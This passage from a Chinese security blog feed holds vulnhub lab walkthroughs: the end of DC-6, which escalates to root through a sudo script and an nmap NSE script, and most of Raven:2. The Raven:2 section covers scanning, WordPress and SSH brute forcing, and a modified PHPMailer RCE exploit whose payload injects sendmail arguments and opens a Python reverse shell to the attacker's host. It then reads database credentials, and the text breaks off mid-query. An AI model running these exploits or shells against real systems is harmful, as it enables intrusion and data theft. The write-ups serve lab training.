class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:/home/jens$ echo &quot;#!/bin/bash\n/bin/bash&quot; &gt; backups.sh <br>-bash: !/bin/bash\n/bin/bash: event not found<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br><br>graham@dc-6:/home/jens$ echo &#x27;#!/bin/bash\n/bin/bash&#x27; &gt; backups.sh<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash\n/bin/bash</span><br>graham@dc-6:/home/jens$ ./backups.sh <br>-bash: ./backups.sh: /bin/bash\n/bin/bash: bad interpreter: No such file or directory<br><br>graham@dc-6:/home/jens$ echo &#x27;#!/bin/bash&#x27; &gt; backups.sh<br>graham@dc-6:/home/jens$ echo &#x27;/bin/bash&#x27; &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>/bin/bash<br><br>graham@dc-6:/home/jens$ sudo -u jens backups.sh<br><br>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:<br><br>    #1) Respect the privacy of others.<br>    #2) Think before you type.<br>    #3) With great power comes great responsibility.<br><br>[sudo] password for graham: <br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>jens@dc-6:~$ <br></code></pre></td></tr></table></figure><p>查看 jens 用户 sudo，发现可以无密码以 root 用户权限执行 nmap：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap<br></code></pre></td></tr></table></figure><p>尝试直接交互式提权，由于版本太高不支持：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ sudo nmap --interactive<br>nmap: unrecognized option &#x27;--interactive&#x27;<br>See the output of nmap -h for a summary of options.<br>jens@dc-6:~$ nmap --version<br><br>Nmap version 7.40 ( https://nmap.org )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select<br></code></pre></td></tr></table></figure><p>以插件方式提权，成功提权并读取到 flag ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ TF=$(mktemp)<br>jens@dc-6:~$ echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt; $TF<br>jens@dc-6:~$ sudo nmap --script=$TF<br><br>Starting Nmap 7.40 ( https://nmap.org ) at 2022-07-12 14:54 AEST<br>NSE: Warning: Loading &#x27;/tmp/tmp.3cEu0ssaoj&#x27; -- the recommended file extension is &#x27;.nse&#x27;.<br>root@dc-6:/home/jens# root<br>root@dc-6:/home/jens# theflag.txt<br>root@dc-6:/home/jens# <br><br>Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b <br> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P <br>  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; <br>   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) <br><br><br>Congratulations!!!<br><br>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol><li>WordPress 站点：用户枚举、后台登录爆破（wpscan）</li><li><code>activity_monitor</code> 插件：远程命令执行</li><li>用户密码泄露</li><li>sudo 提权： .sh 文件提权、nmap 提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Raven：2</title>
    <link href="/2022/07/10/Penetration/Vulnhub/Part-1/0x0B%20Raven-2/"/>
    <url>/2022/07/10/Penetration/Vulnhub/Part-1/0x0B%20Raven-2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0B-Raven-2-vulnhub"><a href="#0x0B-Raven-2-vulnhub" class="headerlink" title="0x0B Raven: 2~vulnhub"></a>0x0B Raven: 2~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/raven-2,269/">Raven: 2 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.158</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span>                       <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-10 05:55 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.00093s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00012s latency).<br>Nmap scan report for 192.168.135.158<br>Host is up (0.0021s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.73 seconds<br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.158</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.158</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-10 05:57 EDT<br>Nmap scan report for 192.168.135.158<br>Host is up (0.00055s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)<br>|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)<br>|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)<br>|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Raven Security<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          34860/tcp6  status<br>|   100024  1          50898/udp6  status<br>|   100024  1          51438/tcp   status<br>|_  100024  1          58223/udp   status<br>51438/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:6F:9A:74 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td>2-4 (RPC #100000)</td></tr><tr><td>51438/tcp</td><td>open</td><td>status</td><td>1 (RPC #100024)</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>111端口</strong></p><p>查看无果</p><p><strong>51438端口</strong></p><p>查看无果</p><p><strong>80端口</strong></p><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.158</span><br>-----------------<br>URL_BASE: http://192.168.135.158/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br>---- Scanning URL: http://192.168.135.158/ ----<br>==&gt; DIRECTORY: http://192.168.135.158/css/<br>==&gt; DIRECTORY: http://192.168.135.158/fonts/<br>==&gt; DIRECTORY: http://192.168.135.158/img/<br>+ http://192.168.135.158/index.html (CODE:200|SIZE:16819)<br>==&gt; DIRECTORY: http://192.168.135.158/js/<br>==&gt; DIRECTORY: http://192.168.135.158/manual/<br>+ http://192.168.135.158/server-status (CODE:403|SIZE:303)<br>==&gt; DIRECTORY: http://192.168.135.158/vendor/<br>==&gt; DIRECTORY: http://192.168.135.158/wordpress/ <br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.158/wordpress/</code> ，发现是个 WordPress 站点。</p><p>枚举 WordPress 用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.158/wordpress --enumerate u</span><br>[+] URL: http://192.168.135.158/wordpress/ [192.168.135.158]<br>[i] User(s) Identified:<br><br>[+] michael<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] steven<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>使用 wpscan 进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;michael\nsteven&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>michael<br>steven<br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P /usr/share/wordlists/rockyou.txt</span><br></code></pre></td></tr></table></figure><p>爆破一段时间后未爆破出 。</p><p>访问 <code>http://192.168.135.158/vendor/</code> ，发现是个目录，查看里面的文件：</p><p>在 <code>http://192.168.135.158/vendor/PATH</code> 中，找到 flag1 以及目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>vendor/<br>flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;<br></code></pre></td></tr></table></figure><p>在 <code>http://192.168.135.158/vendor/README.md</code> 中，得知是 phpMailer 邮件服务：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># PHPMailer - A full-featured email creation <span class="hljs-keyword">and</span> transfer <span class="hljs-keyword">class</span> <span class="hljs-symbol">for</span> <span class="hljs-symbol">PHP</span><br></code></pre></td></tr></table></figure><p>phpMailer 是一个非常强大的 php 发送邮件类，PHPMailer &lt; 5.2.18 中存在高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p><p>可以在 <code>http://192.168.135.158/vendor/VERSION</code> 中查看 phpMailer 的版本，版本为：<code>5.2.16</code> 。</p><p>在 <code>http://192.168.15.172/vendor/</code> 目录下发现了 <code>PHPMailerAutoload.php</code> 文件</p><p><strong>22端口</strong></p><p>得到两个用户名，对 SSH 进行爆破尝试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.135.158 ssh</span><br></code></pre></td></tr></table></figure><p>爆破一段时间后未爆破出 。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>用 searchsploit 查找 phpmailer 的漏洞利用代码，这里使用 40974.py 脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit phpmailer</span>  <br>---------------------------------------------------------------------------- -------------------------------<br> Exploit Title                                                              |  Path<br>---------------------------------------------------------------------------- -------------------------------<br>PHPMailer 1.7 - &#x27;Data()&#x27; Remote Denial of Service                           | php/dos/25752.txt<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40968.sh<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40970.php<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40974.py<br>PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploit)               | multiple/webapps/41688.rb<br>PHPMailer &lt; 5.2.20 - Remote Code Execution                                  | php/webapps/40969.pl<br>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution                    | php/webapps/42221.py<br>PHPMailer &lt; 5.2.21 - Local File Disclosure                                  | php/webapps/43056.py<br>WordPress Plugin PHPMailer 4.6 - Host Header Command Injection (Metasploit) | php/remote/42024.rb<br>---------------------------------------------------------------------------- -------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 40974.py</span><br></code></pre></td></tr></table></figure><p>修改 python 脚本的内容：</p><blockquote><p>PS: 后门文件上传到靶机的路径应该是必须要更改的否则无法反弹shell，且文件名不能用 backdoor.php </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://localhost:8080&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.0.12\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://192.168.135.158/contact.php&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.135.141\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>在 kali 中运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 40974.py</span> <br></code></pre></td></tr></table></figure><p>然后就会在靶机的网站根目录下生成一个 shell.php 文件 。</p><p>kali 中监听 4444 端口，在浏览器中访问 <code>http://192.168.135.158/shell.php</code> 文件，得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                  <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.158] 43229<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>查找 flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -name flag*.txt 2&gt;/dev/null</span><br>/var/www/flag2.txt<br><span class="hljs-meta">$</span><span class="bash"> cat /var/www/flag2.txt</span><br>flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;<br><span class="hljs-meta">$</span><span class="bash"> find / -name flag* 2&gt;/dev/null</span>    <br>/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png<br>/var/www/flag2.txt<br>/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html<br>/sys/devices/pci0000:00/0000:00:11.0/0000:02:01.0/net/eth0/flags<br>/sys/devices/virtual/net/lo/flags<br>/sys/devices/platform/serial8250/tty/ttyS0/flags<br>/sys/devices/platform/serial8250/tty/ttyS1/flags<br>/sys/devices/platform/serial8250/tty/ttyS2/flags<br>/sys/devices/platform/serial8250/tty/ttyS3/flags<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.158/wordpress/wp-content/uploads/2018/11/flag3.png</code> ，得到 flag3 。</p><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查看数据库配置文件，得到数据库账号密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /var/www/html/wordpress/wp-config.php</span><br>// ** MySQL settings - You can get this info from your web host ** //<br>/** The name of the database for WordPress */<br>define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);<br><br>/** MySQL database username */<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br><br>/** MySQL database password */<br>define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);<br><br>/** MySQL hostname */<br>define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);<br><br>/** Database Charset to use in creating database tables. */<br>define(&#x27;DB_CHARSET&#x27;, &#x27;utf8mb4&#x27;);<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define(&#x27;DB_COLLATE&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>登录 mysql，发现会一直卡住，好像 nc 模式下的 shell 不支持交互，利用 python 提升到伪终端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.158] 43239<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> mysql -uroot -pR@v3nSecurity</span><br>^C<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.158] 58710<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br>www-data@Raven:/var/www/html$ mysql -uroot -pR@v3nSecurity<br>mysql -uroot -pR@v3nSecurity<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>选择 <code>wordpress</code> 数据库，在 <code>wp_users</code> 表中找到两个用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| wordpress          |<br>+--------------------+<br>4 rows in set (0.05 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>use wordpress;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>show tables;<br>+-----------------------+<br>| Tables_in_wordpress   |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>12 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select 